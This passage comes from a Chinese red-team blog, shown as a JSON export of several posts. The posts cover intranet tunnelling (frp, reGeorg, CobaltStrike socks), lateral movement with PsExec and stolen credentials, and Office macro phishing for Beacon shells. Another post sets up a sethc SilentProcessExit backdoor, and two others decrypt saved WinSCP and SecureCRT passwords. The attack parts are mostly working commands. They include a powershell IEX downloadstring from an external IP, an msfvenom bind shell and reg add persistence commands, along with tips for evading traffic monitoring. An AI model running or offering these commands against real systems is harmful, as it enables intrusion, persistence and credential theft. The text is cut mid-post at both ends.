&gt; set payload windows/meterpreter/bind_tcp_rc45msf5 exploit(multi/handler) &gt; set rc4password AnonySec6msf5 exploit(multi/handler) &gt; set rhost 192.168.144.1557msf5 exploit(multi/handler) &gt; set lport 4438msf5 exploit(multi/handler) &gt; run -j总结SSH隧道的实战利用，需要全方位考虑，本文只是讲述了SSH端口转发的思路，实际更需要去探索如何应对某些极端的目标内网环境！","categories":[{"name":"SSH隧道","slug":"SSH隧道","permalink":"https://payloads.cn/categories/SSH%E9%9A%A7%E9%81%93/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"实战中内网穿透的打法","slug":"实战中内网穿透的打法","date":"2020-01-05T13:35:48.000Z","updated":"2020-07-03T16:45:26.010Z","comments":true,"path":"2020/0105/how-to-penetrate-the-intranet-in-actual-combat.html","link":"","permalink":"https://payloads.cn/2020/0105/how-to-penetrate-the-intranet-in-actual-combat.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言在内网渗透时，一个WebShell或CobaltStrike、Metasploit上线等，只是开端，更多是要内网横向移动，扩大战果，打到核心区域。但后渗透的前提是需要搭建一条通向内网的“专属通道”，才能进一步攻击。可实战中因为网络环境不同，所利用的方式就不同。以下为自我总结“实战中内网穿透的打法”思维导图：目标出网（socks代理）这是实战中最愿意碰到的网络环境，目标机可以正常访问互联网，可直接在目标机挂socks代理或CobaltStrike上线，打通目标的内网通道。Frp（socks5）Frp服务端配置文件：1[common]2bind_port = 8080Frp客户端配置文件：1[common]2server_addr = xx.xx.xx.xx3server_port = 80804#服务端口使用Web常见端口56[socks5]7type = tcp8remote_port = 80889plugin = socks510use_encryption = true 11use_compression = true12#socks5口令13#plugin_user = SuperMan14#plugin_passwd = XpO2McWe6nj3此处添加了加密压缩这两个功能，默认是不开启的，根据作者介绍，压缩算法使用的是 snappy。use_encryption = true 启用加密 [通信内容加密传输，有效防止流量被拦截]use_compression = true 启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]use_encryption = true 、use_compression = true 必须放在相关协议下面。frp客户端与配置文件传到目标机后，把程序名与配置文件进行修改，并放在系统相关文件夹中，做到隐蔽。加密压缩的对比这是frp客户端配置文件中未使用encryption与compression功能，利用metasploit挂socks代理，扫描ms17_010传输的数据包，明显可辨别出具体攻击行为。如果目标内网有”态势感知“、流量分析等安全设备，就会被监测到，导致权限丢失。使用encryption与compression功能后，虽攻击源地址同样会暴露，但传输的数据包却无法辨别，规避了内网中的安全监测设备。CobaltStrike (socks4a)到已控目标机的Beacon下将socks代理开启。1beacon &gt; socks 1024 #端口根据VPS实际情况进行设置菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。上线不出网机器这是link链接，只要主链路(出网机Beacon)掉线，均掉！SMB Beacon官方对SMB Beacon的介绍：SMB Beacon是使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽。创建一个SMB的Listener (host与port可无视)，注意Listener选择，在session中选择route可达的主机派生会话。运行成功后，可以看到 ∞∞ 这个字符，这就是派生SMB Beacon的连接状态。可在主Beacon上用link host链接或unlink host断开。1beacon&gt; link 192.168.144.1552beacon&gt; unlink 192.168.144.155Link Listener在已上线的主机创建Listener。导出该类型Listener对应的可执行文件或dll等。选择刚建立的Listener。上传刚才生成的payload到当前已上线的目标机中，这里用PsExec.exe 工具 。(CobalStrike本身psexec功能不够强大)在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe1beacon&gt; shell netstat -ano |findstr 4444SSH Login1beacon&gt; ssh 192.168.144.174:22 root admin2beacon&gt; ssh 192.168.144.203:22 root admin在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。目标不出网（http代理）目标机网络中可能有防火墙、网闸等，只允许http单向出，无法正常访问互联网，用上述socks方法是行不通的，只能用http代理进行渗透。reGeorg (socks5)1python reGeorgSocksProxy.py -u http://192.168.144.211/tunnel.aspx -l 0.0.0.0 -p 10080利用metasploit挂reGeorg socks代理，扫描ms17_010传输的数据包，明显可辨别攻击行为。Neo-reGeorg (加密)1python neoreg.py -k test@123 -l 0.0.0.0 -p 10081 -u http://192.168.144.211/neo-tunnel.aspx使用Neo-reGeorg后，数据包已被加密传输。冰蝎 (开socks5)冰蝎的数据包传输是加密的，本身也具备socks代理功能，但传输过程中存在丢包情况。这里同样是利用metasploit探测ms17_010漏洞，结果显示不存在。当不设置代理探测时，实际漏洞是存在的。虽然冰蝎的这种代理扫描方式不如reGeorg准确，但小线程的端口探测等是可行的，如 auxiliary/scanner/portscan/tcp。准确度更多是因某种探测或其他方式的数据包在传输过程中的多少而决定。reduh (单端口转发)当目标服务器中间件等服务版本较低，reGeorg或冰蝎马等无法正常解析，就需要换用其它的http代理脚本。这是某实战中遇到的环境：这里以reduh为例，虽然只能对指定的端口进行转发 (不适用图形化连接操作)，但可以先利用msfvenom生成正向的shell payload，再结合reduh单端口转发，上线metasploit，最后利用socks4a模块开代理。下面把具体的流程走一遍：1sudo msfvenom --platform windows -p windows/shell_bind_tcp lport=53 -e x86/shikata_ga_nai -i 5 -f exe -o x86shell.exe23--platform &lt;platform&gt; 指定payload的目标平台4-e, --encoder &lt;encoder&gt; 指定需要使用的编码器5-i, --iterations &lt;count&gt; 指定payload的编码次数上传payload到目标服务器，并执行。metasploit是监听转发后的地址与端口。1sudo msfconsole -q2msf5 &gt; use exploit/multi/handler3msf5 exploit(multi/handler) &gt; set payload windows/shell_bind_tcp4msf5 exploit(multi/handler) &gt; set rhost 127.0.0.15msf5 exploit(multi/handler) &gt; set lport 53536msf5 exploit(multi/handler) &gt; run -jreDuhServer传到目标机后，使用reDuhClient进行连接，并将反弹的端口转本地后，1java -jar reDuhClient.jar http://103.242.xx.xx/reduh.aspx23telnet 127.0.0.1 1010 4&gt;&gt;[createTunnel]5353:127.0.0.1:53可在metasploit渗透，或开启一个socks4a，挂载其他安全工具上继续渗透。1msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a2msf5 auxiliary(server/socks4a) &gt; set srvport 100803msf5 auxiliary(server/socks4a) &gt; run -j注意为什么payload要用shell，而不用meterpreter。meterpreter是高级的payload，传输中占用大量数据包，这种单端口转发上线metasploit，本就不是很稳定，meterpreter会使“小水管”更加不稳定！隔离网络（多级代理）内网渗透中，会遇到隔离网络，更多时候是逻辑上的隔离，突破的办法就是拿到route可达的跳板机 (多张网卡、运维机等)的权限，建立一层二级代理、三级代理…frp现拿到一台双网卡内网服务器权限，可以用frp建立通道，这台服务器既是服务端也是客户端。proxifier用frp建立好后，结合proxifier添加两条代理：外网socks、内网socks，之后创建代理链 。(注意代理顺序)设置代理规则，选择对应代理。二层代理成功，内网隔离机445探测开放。Proxychains命令行代理神器proxychains，设置二层代理、socks口令。(注意代理顺序)联动metasploit，ms17_010探测，可以看到代理链的传输过程。Metasploit针对metasploit的利用，只要sessions中的route可达，就可以直接进行多层网络渗透，更加方便。但主session掉，均掉！在获取目标一个sessions 后，可以查看IP段信息并自动添加路由表。1msf5 exploit(multi/handler) &gt; sessions 12meterpreter &gt; run get_local_subnets3meterpreter &gt; run autoroute -p4meterpreter &gt; run post/multi/manage/autoroute5meterpreter &gt; run autoroute -p6meterpreter &gt; background上述是在meterpreter权限中添加，或当知道目标路由表信息时，可直接添加。1msf5 exploit(multi/handler) &gt; route add 172.20.20.0/24 1 //session id 12msf5 exploit(multi/handler) &gt; route可在metasploit继续渗透，或开启一个socks，挂载其他工具上多层穿透。1msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a2msf5 auxiliary(server/socks4a) &gt; set srvport 100803msf5 auxiliary(server/socks4a) &gt; run -j总结内网穿透时，代理需要稳定、隐蔽，思路更需要不断的拓宽。毕竟在实战中，多么复杂的环境都会遇到，更多的是总结不同打法，进行落地，最终将内网的“大门”打开！有不同见解，或更优的方法可随时交流^_^","categories":[{"name":"总结","slug":"总结","permalink":"https://payloads.cn/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrike进阶篇-批量上线","slug":"CobaltStrike进阶篇-批量上线","date":"2019-12-12T18:00:36.000Z","updated":"2020-07-03T16:45:26.006Z","comments":true,"path":"2019/1213/cobaltstrike-advanced-chapterbatch-launch.html","link":"","permalink":"https://payloads.cn/2019/1213/cobaltstrike-advanced-chapterbatch-launch.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言当获取一台目标服务器权限时，更多是想办法扩大战果，获取目标凭据并横向进行登陆是最快速的拿权方式。但目标所处环境是否可出网，如何利用CobalStrike进行批量上线，正是本文所要讲述的内容。获取凭据目标机器CobalStrike上线后，通常先抓取该主机凭据，选择执行 Access–&gt;Run Mimikatz ，或在Beacon中执行logonpasswords命令。需要当前会话为管理员权限，才能成功，如果权限低，请先提权~点击工具栏的Credentials，可以看到获取的凭据信息。（Credentials可自行添加）当然，不是每次都能成功获取到明文密码的，要看内存中是否存储。目标机出网psexec传递获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ）使用portscan命令：ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。1beacon&gt; portscan 192.168.144.0/24 445 arp 200点击工具栏的View–&gt;Targets，查看端口探测后的存活主机。（Targets可自行添加）选择Login–&gt;psexec传递登录。选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。在Beacon中可以看到执行的命令，并会显示成功登录的ip，之后就便会上线CobalStrike。这样就控制了多个主机的系统权限。附：psexec密文传递Beacon中执行的命令。【不是psexec(psh)选项】目标机不出网Link Listener实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。首先，在已上线的主机创建Listener，监听端口可自定义。选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。注意，选择刚建立的Listener名字，Proxy可不设置，这里生成exe保存本地。(未免杀)上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe 。（CobalStrike本身psexec功能不够强大，且方法不唯一）在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe端口查看，实际不出网目标机（192.168.144.196）是与出网目标机（192.168.144.155）正在建立连接。1beacon&gt; shell netstat -ano |findstr 4444因为这是link链接，只要主链路（即出网机Listener）掉线，就都会掉线！SSH登录ssh批量登录比较简单，同样利用当前已上线的目标机进行登录。1beacon&gt; portscan 192.168.144.170-210 22 arp 200在Credentials中添加ssh的口令信息。（ssh口令可事先通过其他方式获取，不建议用此工具进行ssh爆破，效率慢）选择Login–&gt;ssh登录。选择刚添加的ssh口令，主机Session，即从哪台主机连接过去。ssh成功登录后，就实现了Linux目标机的上线，在Beacon中可以看到执行的命令。若需要上线的Linux主机不多，可直接在Beacon中执行命令。在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。总结本文只是讲述针对不同环境的不同上线方式，利用CobalStrike对已获取权限的主机进行批量上线。不要把CobalStrike当成最优的端口探测与口令爆破方式，工具的特性并不在此。毕竟在内网中拿权要有效率，不能浪费太多时间，工具间要进行互补，发挥各自的优势。当然，上线的方式也不要局限此处！","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"CobaltStrike与Metasploit实战联动","slug":"CobaltStrike与Metasploit实战联动","date":"2019-12-10T16:22:29.000Z","updated":"2020-07-03T16:45:26.105Z","comments":true,"path":"2019/1211/cobaltstrike-and-metasploit-linkage.html","link":"","permalink":"https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-linkage.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用。两者更需要灵活的联动，各自相互依托，从而提升渗透的效率。内置Socks功能通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透。当然，也可以把代理设置在其他的工具上，不限于Proxychains、Proxifier等。首先，到已控目标机的Beacon下将socks代理开启。1beacon &gt; socks 1024 #端口根据VPS实际情况进行设置点开菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中。本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。1msf5 &gt; setg Proxies socks4/5:ip:port #让msf所有模块的流量都通过此代理走。(setg全局设置)2msf5 &gt; setg ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)3msf5 &gt; use auxiliary/scanner/smb/smb_ms17_0104msf5 &gt; set rhosts 192.168.144.0/245msf5 &gt; set threads 100 #内网渗透时线程不要太高！6msf5 &gt; run利用MSF模块上线Beacon shell当通过其它方式拿到了目标内网中某台Windows机器的本地管理员明文密码或hash时，可利用Metasploit下auxiliary/admin/smb/psexec_command模块，直接上线指定目标机器的Beacon shell。(前提目标机可出网)先利用CobalStrike生成上线Beacon的powershell。本地启动Metasploit，挂上代理，设置psexec_command模块参数。1msf5 &gt; setg Proxies socks4/5:ip:port2msf5 &gt; use auxiliary/admin/smb/psexec_command3msf5 &gt; set rhosts 192.168.144.0/244msf5 &gt; set threads 105msf5 &gt; set smbuser administrator6msf5 &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #明文、密文均可7msf5 &gt; set command powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://149.28.xx.xx:80/a'))\" #上线CS的powershell，目标机存在杀软需考虑8msf5 &gt; run最终，只要密码一致、 能出网，且未被杀软阻止的均会成功上线。CS与MSF会话互传CobaltStrike派生Metasploit当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令：1msf5 &gt; use exploit/multi/handler2msf5 &gt; set payload windows/meterpreter/reverse_tcp #不要用x64的payload3msf5 &gt; set lhost 10.11.42.994msf5 &gt; set lport 53535msf5 &gt; run -j之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口。然后选中计算机，右键-&gt;Spawn：选择MSF的监听器：这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。Metasploit派生CobaltStrike现在已经获得了一个meterpreter的session，把session传给CobaltStrike。在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接。\u0001接下来，把meterpreter获得的session转交给CobaltStrike，在Metasploit执行以下命令：1meterpreter &gt; background 2msf5 &gt; use exploit/windows/local/payload_inject 3msf5 &gt; set payload windows/meterpreter/reverse_http4msf5 &gt; set lhost 192.168.144.1745msf5 &gt; set lport 80996msf5 &gt; set DisablePayloadHandler true 7msf5 &gt; set session 18msf5 &gt; run解释一下这些参数。由于CobaltStrike的监听器我们使用的是：windows/beacon_http/reverse_http所以我们的payload也要使用：payload windows/meterpreter/reverse_http设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要设置成CobaltStrike机器的IP与端口。默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置：set DisablePayloadHandler true设置当前的session，执行run。此时目标机便已成功从CobaltStrike上线。总结关于CobalStrike与Metasploit 的联动利用方式远不止这些，每种方式在实战中都有对应的应用场景，更需要探索与总结。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"Office宏的基本利用","slug":"Office宏的基本利用","date":"2019-12-09T06:35:09.000Z","updated":"2020-07-03T16:45:25.957Z","comments":true,"path":"2019/1209/basic-use-of-office-macro.html","link":"","permalink":"https://payloads.cn/2019/1209/basic-use-of-office-macro.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。环境准备Windows 7 x64 旗舰版Microsoft Office 2016CobaltStrike 3.14CobaltStrike生成宏先利用CobaltStrike生成宏payload，接下来只要放入word、excel或ppt即可。创建宏Word打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。编写主体内容后，点击 “开发工具 — Visual Basic” 。双击 “ThisDocument” ，将原有内容全部清空，然后将CobaltStrike生成宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码。反弹Beacon shell默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知。诱导目标手动点击”启用内容”宏。目标一旦启用，CobaltStrike的Beacon就会上线，即成功接收到Shell。宏代码分析CobaltStrike生成默认的VBA会导入四个Windows API函数，常见的ShellCode加载器代码：CreateRemoteThread 创建一个在其它进程地址空间中运行的线程(也称:创建远程线程).VirtualAllocEx 指定进程的虚拟空间保留或提交内存区域WriteProcessMemory 写入某一进程的内存区域CreateProcess 创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件其中Array(-4,-24,-119,0,0,0,96,-119,-27...就是ShellCode，混淆的办法有很多种。ShellCode可以自己在VBA里解码或者比如每个元素自增1，运行的时候-1，达到免杀 ……","categories":[{"name":"钓鱼","slug":"钓鱼","permalink":"https://payloads.cn/categories/%E9%92%93%E9%B1%BC/"}],"tags":[{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"}]},{"title":"Shfit映像劫持后门新玩法","slug":"Shfit映像劫持后门新玩法","date":"2019-12-05T05:08:11.000Z","updated":"2020-01-09T05:36:48.535Z","comments":true,"path":"2019/1205/shfit-image-hijacks-backdoor-new-gameplay.html","link":"","permalink":"https://payloads.cn/2019/1205/shfit-image-hijacks-backdoor-new-gameplay.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn映像劫持简介映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。简单测试映像劫持技术的利用，存在已久，这里再简单说明下：修改注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\\windows\\system32\\cmd.exe之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。映像劫持后门新玩法实现效果键入五下Shift执行时，先执行sethc.exe程序，当sethc.exe程序静默退出时，执行CobaltStrike的Powershell，反弹Beacon shell 。简单来说就是：程序A静默退出结束后，会执行程序B。GFlages测试文章地址：https://blogs.msdn.microsoft.com/junfeng/2004/04/28/image-file-execution-options/下载gflags.exehttps://docs.microsoft.com/zh-cn/previous-versions/msdn10/gg463016(v=msdn.10)根据微软的官方文档描述，在Silent Process Exit选项卡中的配置，都保存在注册表中。GFlags工具自动添加并修改了“IFEO”目录下sethc.exe的GlobalFlag值。以及SilentProcessExit下ReportingMode和MonitorProcess两个值。这时测试会发现，当键入五下Shift时，先执行sethc.exe程序，当sethc.exe程序静默退出时，便会执行cmd.exe程序。这么一来，可以直接在命令行中对注册表进行设置。（需要管理员权限）1reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f2reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v GlobalFlag /t REG_DWORD /d 512 /f3reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe\" /v ReportingMode /t REG_DWORD /d 1 /f4reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe\" /v MonitorProcess /t REG_SZ /d \"c:\\windows\\system32\\cmd.exe\" /f简单解释一下ReportingMode和MonitorProcess 这两个项值的作用。MonitorProcess的值表示监视器进程。Reporting Mode可以设置为三个值 。FlagValue解释LAUNCH_MONITORPROCESS0x1检测到进程静默退出时，将会启动监视器进程（在GFLAGS.exe中，Silent Process Exit这个选项卡所填写的值，即MonitorProcess的项值）LOCAL_DUMP0x2检测到进程静默退出时，将会为受监视的进程创建转储文件NOTIFICATION0x4检查到进程静默退出时，将会弹出一个通知与CobaltStrike结合利用换位思考，用上述的方法，修改MonitorProcess值放入CobaltStrike的powershell。这样，可以在渗透中做到权限的维持，按五下Shift就可以隐蔽进行反连。实测，Windows锁屏，键入五下Shift后正常弹粘滞键，关闭之后执行powershell代码，反弹beacon的shell。","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows后门","slug":"Windows后门","permalink":"https://payloads.cn/tags/Windows%E5%90%8E%E9%97%A8/"}]},{"title":"解密Winscp客户端中保存的密码hash","slug":"解密Winscp客户端中保存的密码hash","date":"2019-12-04T14:08:50.000Z","updated":"2020-07-03T16:45:26.007Z","comments":true,"path":"2019/1204/decrypt-the-password-hash-saved-in-winscp-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-the-password-hash-saved-in-winscp-client.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言WinSCP是一个Windows环境下使用的SSH的开源图形化SFTP客户端。同时支持SCP协议。它的主要功能是在本地与远程计算机间安全地复制文件，并且可以直接编辑文件。而我们的主要目的是为了读取里面各种的SSH连接密码。所有操作全部在管理员权限下进行最新版Winscp为例通过powershell脚本搞定，或者RDP直接登录连接查询等。 「绿色版无安装记录」1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps12beacon&gt; powershell Get-list前提，目标得事先保存连接密码。确定Winscp存储位置默认情况下，Winscp配置会存储在Windows对应的注册表项下（包括了连接的IP、用户名、密码Hash）。HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\具体解密过程查看Winscp配置的Windows注册表（注册表项是固定的），如果有连接会话，再指定查询连接下所保存的密码Hash。1beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions&quot;2beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\root@192.168.144.128&quot;将查到的信息拷贝到本地的winscppwd.exe进行解密。RDP直接登录目标，导出Winscp配置文件，并下载到本地进行解密。(如果找到配置的ini文件，直接把对应文件down本地进行解密即可)附脚本工具ListInstalledPrograms.ps1winscppwd.exe","categories":[{"name":"内网密码搜集","slug":"内网密码搜集","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"解密SecureCRT客户端中保存的密码hash","slug":"解密SecureCRT客户端中保存的密码hash","date":"2019-12-04T14:08:30.000Z","updated":"2019-12-12T12:42:06.368Z","comments":true,"path":"2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用文章末的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了。确定目标SecureCRT的详细版本想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）。1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps12beacon&gt; powershell Get-list确定SecureCRT配置文件目录下的Sessions目录默认情况下，SecureCRT的Config目录路径为：%APPDATA%\\VanDyke\\Config\\Sessions\\如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认。Sessions目录下的每个ini文件都会以连接的IP或域名来命名。1beacon&gt;shell dir %APPDATA%\\VanDyke\\Config\\Sessions\\拷贝下载Sessions目录的ini文件直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;Invoke-NinjaCopy.ps12beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\\Users\\r00t\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.144.128.ini&quot; -LocalDestination &quot;c:\\windows\\temp\\192.168.144.128.ini&quot;3beacon&gt; shell dir c:\\windows\\temp\\192.168.144.128.ini 4beacon&gt; download c:\\windows\\temp\\192.168.144.128.ini脚本解密Session将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！1sudo pip2 install pycrypto1python SecureCRT-decryptpass.py 192.168.144.128.iniSecureCRT高版本解决如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\\VanDyke\\Config\\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。目标SecureCRT版本与本地版本需一致，否则可能会出现问题。附脚本ListInstalledPrograms.ps1Invoke-NinjaCopy.ps1SecureCRT-decryptpass.py","categories":[{"name":"内网密码搜集","slug":"内网密码搜集","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"Frp内网穿透实战","slug":"Frp内网穿透实战","date":"2019-12-04T14:07:28.000Z","updated":"2020-07-03T16:45:25.983Z","comments":true,"path":"2019/1204/frp-intranet-penetration-actual-combat.html","link":"","permalink":"https://payloads.cn/2019/1204/frp-intranet-penetration-actual-combat.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言实战中，当通过某种方式拿下目标机器权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。更多详细使用方法，可查看官方Github，这里不再赘述。https://github.com/fatedier/frp/前期准备先准备一台VPS与域名。因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。下载地址Frp下载地址 [跨平台，实战中根据目标机版本选择下载]https://github.com/fatedier/frp/releases配置文件服务端1#通用配置段2[common]3#frp服务端监听 